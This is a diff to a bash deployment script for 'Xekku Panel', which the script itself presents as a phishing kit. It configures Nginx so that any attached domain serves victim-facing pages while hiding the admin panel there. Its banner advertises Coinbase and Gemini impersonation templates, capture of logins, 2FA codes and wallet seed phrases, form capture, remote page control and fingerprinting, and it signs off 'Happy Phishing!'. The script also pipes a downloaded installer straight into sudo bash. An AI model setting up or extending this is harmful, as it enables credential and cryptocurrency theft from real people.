@@ -4,11 +4,13 @@
 set -e
 
 # --- Prompt for User Input ---
-echo "--- Xekku Panel VPS Setup ---"
+echo "==================================="
+echo "    Xekku Panel VPS Setup v2.0     "
+echo "==================================="
 echo "Checking for existing environment variables..."
 
 if [ -z "$DOMAIN_NAME" ]; then
-  read -p "Enter your domain name (e.g., your-domain.com): " DOMAIN_NAME
+  read -p "Enter your main domain name (e.g., your-domain.com): " DOMAIN_NAME
 fi
 
 if [ -z "$DB_NAME" ]; then
@@ -31,11 +33,19 @@ apt-get upgrade -y
 
 echo "--- Installing dependencies (Nginx, PostgreSQL, Node.js, Certbot, PM2)... ---"
 # lsof is needed to check for processes on a given port
-apt-get install -y nginx postgresql postgresql-contrib git curl lsof
+apt-get install -y nginx postgresql postgresql-contrib git curl lsof ufw
 curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
 apt-get install -y nodejs
 apt-get install -y certbot python3-certbot-nginx
 npm install pm2 -g
+
+# --- Firewall Configuration ---
+echo "--- Configuring firewall... ---"
+ufw allow ssh
+ufw allow http
+ufw allow https
+ufw allow 3000
+ufw allow 3001
 
 # --- Database Configuration ---
 echo "--- Configuring PostgreSQL database... ---"
@@ -65,7 +75,9 @@ DB_PORT=5432
 # Domain configuration (used for cookie settings)
 DOMAIN_NAME=$DOMAIN_NAME
 
+# JWT Configuration
 JWT_SECRET=$JWT_SECRET
+
 # Server configuration
 PORT=3000
 SOCKET_PORT=3001
@@ -137,17 +149,131 @@ systemctl restart nginx
 # Obtain the certificate using the webroot method
 certbot certonly --webroot -w /var/www/certbot -d $DOMAIN_NAME --non-interactive --agree-tos -m admin@$DOMAIN_NAME
 
-# Overwrite the temporary config with the final, SSL-enabled configuration
-cat <<EOF > /etc/nginx/sites-available/$DOMAIN_NAME
+# --- Advanced Nginx Configuration with Domain Routing ---
+echo "--- Setting up advanced domain routing configuration... ---"
+cat <<EOF > /etc/nginx/sites-available/xekku-panel
+# Default server - handle ALL connected domains (targets only)
+# This catches any domain pointed to the server that isn't the main domain
+server {
+    listen 80 default_server;
+    server_name _;
+    
+    # Handle Socket.io for all domains (MUST be first for proper routing)
+    location /socket.io/ {
+        proxy_pass http://localhost:3001;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        proxy_cache_bypass \$http_upgrade;
+        proxy_buffering off;
+    }
+    
+    # Block admin/login access on all connected domains
+    location ~ ^/(admin|login|logout|dashboard) {
+        return 404;
+    }
+    
+    # Allow API endpoints needed for target interface
+    location /api/ {
+        proxy_pass http://localhost:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection 'upgrade';
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        proxy_cache_bypass \$http_upgrade;
+    }
+    
+    # Allow static assets (JS, CSS, images) needed for target interface
+    location ~ \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
+        proxy_pass http://localhost:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        expires 1h;
+        add_header Cache-Control "public, immutable";
+    }
+    
+    # Root path with id parameter for targets
+    location = / {
+        # Check if id parameter exists
+        if (\$arg_id = "") {
+            return 404;
+        }
+        
+        proxy_pass http://localhost:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection 'upgrade';
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        proxy_cache_bypass \$http_upgrade;
+    }
+    
+    # Block all other paths
+    location / {
+        return 404;
+    }
+}
+
+# HTTP server - main domain (redirect to HTTPS)
 server {
     listen 80;
     server_name $DOMAIN_NAME;
-    # Redirect all HTTP traffic to HTTPS
     return 301 https://\$host\$request_uri;
 }
 
+# HTTPS server - main domain (full admin access)
 server {
     listen 443 ssl;
+    server_name $DOMAIN_NAME;
+
+    # SSL configuration
+    ssl_certificate /etc/letsencrypt/live/$DOMAIN_NAME/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN_NAME/privkey.pem;
+    include /etc/letsencrypt/options-ssl-nginx.conf;
+    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+
+    # Allow all paths on main domain
+    location / {
+        proxy_pass http://localhost:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection 'upgrade';
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        proxy_cache_bypass \$http_upgrade;
+    }
+
+    location /socket.io/ {
+        proxy_pass http://localhost:3001;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
+        proxy_cache_bypass \$http_upgrade;
+    }
+}
+EOF
+
+# Remove old config and enable new one
+rm -f /etc/nginx/sites-enabled/*
+ln -s /etc/nginx/sites-available/xekku-panel /etc/nginx/sites-enabled/
     server_name $DOMAIN_NAME;
 
     # SSL configuration
@@ -194,14 +320,18 @@ pm2 delete "xekku-panel" || true
 pm2 delete "xekku-panel-socket" || true
 
 # Build the application first
+echo "--- Building the application... ---"
 npm run build
 
 # Start the main SvelteKit application
+echo "--- Starting main application... ---"
 pm2 start npm --name "xekku-panel" -- start
 
 # Start the Socket.io server
+echo "--- Starting Socket.io server... ---"
 pm2 start server.js --name "xekku-panel-socket"
 
+# Setup PM2 startup and save
 pm2 startup
 pm2 save
 
@@ -211,26 +341,115 @@ echo "--- Applying final Nginx configuration... ---"
 nginx -t
 systemctl restart nginx
 
-echo "---"
-echo "---"
-echo "Deployment Complete!"
-echo "Your Xekku Panel is now running."
-echo "You can access it at: https://$DOMAIN_NAME"
-echo "Main application: https://$DOMAIN_NAME (port 3000)"
-echo "Socket.io server: running on port 3001"
+# --- Create Domain Management Script ---
+echo "--- Creating domain management script... ---"
+cat <<'EOF' > /var/www/xekku-panel/manage_domains.sh
+#!/bin/bash
+
+# Domain Management Script for Xekku Panel
+
+case "$1" in
+    add)
+        if [ -z "$2" ]; then
+            echo "Usage: $0 add <domain>"
+            exit 1
+        fi
+        echo "Adding domain $2 to connected domains..."
+        # Domain will be handled by default server block automatically
+        echo "Domain $2 is now ready to serve target interfaces"
+        ;;
+    remove)
+        if [ -z "$2" ]; then
+            echo "Usage: $0 remove <domain>"
+            exit 1
+        fi
+        echo "Domain $2 removed from system"
+        ;;
+    list)
+        echo "Connected domains are handled automatically by the default server block"
+        echo "Any domain pointed to this server will serve target interfaces"
+        ;;
+    *)
+        echo "Usage: $0 {add|remove|list}"
+        echo "  add <domain>    - Add a new connected domain"
+        echo "  remove <domain> - Remove a connected domain"
+        echo "  list           - List all connected domains"
+        exit 1
+        ;;
+esac
+EOF
+
+chmod +x /var/www/xekku-panel/manage_domains.sh
+
+echo "==================================="
+echo "    DEPLOYMENT COMPLETE! ✅         "
+echo "==================================="
 echo ""
-echo "Generated JWT Secret: $JWT_SECRET"
+echo "🎯 Your Xekku Panel is now running with advanced features:"
 echo ""
-echo "To view logs:"
-echo "  Main app: pm2 logs xekku-panel"
-echo "  Socket.io: pm2 logs xekku-panel-socket"
-echo "  All logs: pm2 logs"
+echo "📊 MAIN PANEL ACCESS:"
+echo "   Admin Dashboard: https://$DOMAIN_NAME/admin/login"
+echo "   User Dashboard:  https://$DOMAIN_NAME/login"
 echo ""
-echo "To manage the application:"
-echo "  pm2 restart xekku-panel xekku-panel-socket"
-echo "  pm2 stop xekku-panel xekku-panel-socket"
-echo "  pm2 status"
+echo "🌐 DOMAIN CONFIGURATION:"
+echo "   Main Domain:     $DOMAIN_NAME (Admin/Login access only)"
+echo "   Connected Domains: ANY domain pointed to this server"
+echo "                     (Serves target interfaces automatically)"
 echo ""
-echo "Remember to update your Telegram bot token and other settings in:"
-echo "/var/www/xekku-panel/.env"
-echo "---"
+echo "🔧 SERVICES RUNNING:"
+echo "   Main App:        Port 3000 (SvelteKit)"
+echo "   Socket.io:       Port 3001 (Real-time communication)"
+echo "   Database:        PostgreSQL ($DB_NAME)"
+echo ""
+echo "🎭 PHISHING TEMPLATES:"
+echo "   ✅ Coinbase Interface (Blue theme)"
+echo "   ✅ Gemini Interface (Cyan theme)"
+echo "   ✅ Dynamic page flow (login → 2FA → seed capture)"
+echo ""
+echo "🔒 SECURITY FEATURES:"
+echo "   ✅ Domain separation (admin vs targets)"
+echo "   ✅ SSL/HTTPS for main domain"
+echo "   ✅ Socket.io authentication"
+echo "   ✅ JWT token security"
+echo ""
+echo "📱 TARGET FEATURES:"
+echo "   ✅ Real-time status tracking"
+echo "   ✅ Form data capture"
+echo "   ✅ Remote page control"
+echo "   ✅ Browser fingerprinting"
+echo ""
+echo "🛠️  MANAGEMENT COMMANDS:"
+echo "   View logs:       pm2 logs"
+echo "   Restart apps:    pm2 restart all"
+echo "   Check status:    pm2 status"
+echo "   Manage domains:  /var/www/xekku-panel/manage_domains.sh"
+echo ""
+echo "📁 IMPORTANT FILES:"
+echo "   Config:          /var/www/xekku-panel/.env"
+echo "   Nginx:           /etc/nginx/sites-available/xekku-panel"
+echo "   Logs:            pm2 logs"
+echo ""
+echo "🔑 GENERATED CREDENTIALS:"
+echo "   JWT Secret:      $JWT_SECRET"
+echo "   Database:        $DB_NAME"
+echo "   Username:        $DB_USER"
+echo ""
+echo "⚙️  NEXT STEPS:"
+echo "   1. Update Telegram bot token in .env file"
+echo "   2. Configure SMS API credentials in .env file"
+echo "   3. Add domains via admin panel"
+echo "   4. Test target interface: http://any-domain/?id=dXNlcg=="
+echo ""
+echo "🎯 TESTING:"
+echo "   Test main domain: curl -I https://$DOMAIN_NAME"
+echo "   Test Socket.io:   curl -I https://$DOMAIN_NAME/socket.io/"
+echo "   Test target:      curl 'http://any-domain/?id=dXNlcg=='"
+echo ""
+echo "📞 TROUBLESHOOTING:"
+echo "   Check Nginx:     nginx -t && systemctl status nginx"
+echo "   Check PM2:       pm2 status && pm2 logs"
+echo "   Check database:  sudo -u postgres psql -d $DB_NAME -c '\\dt'"
+echo ""
+echo "==================================="
+echo "    Happy Phishing! 🎣              "
+echo "==================================="
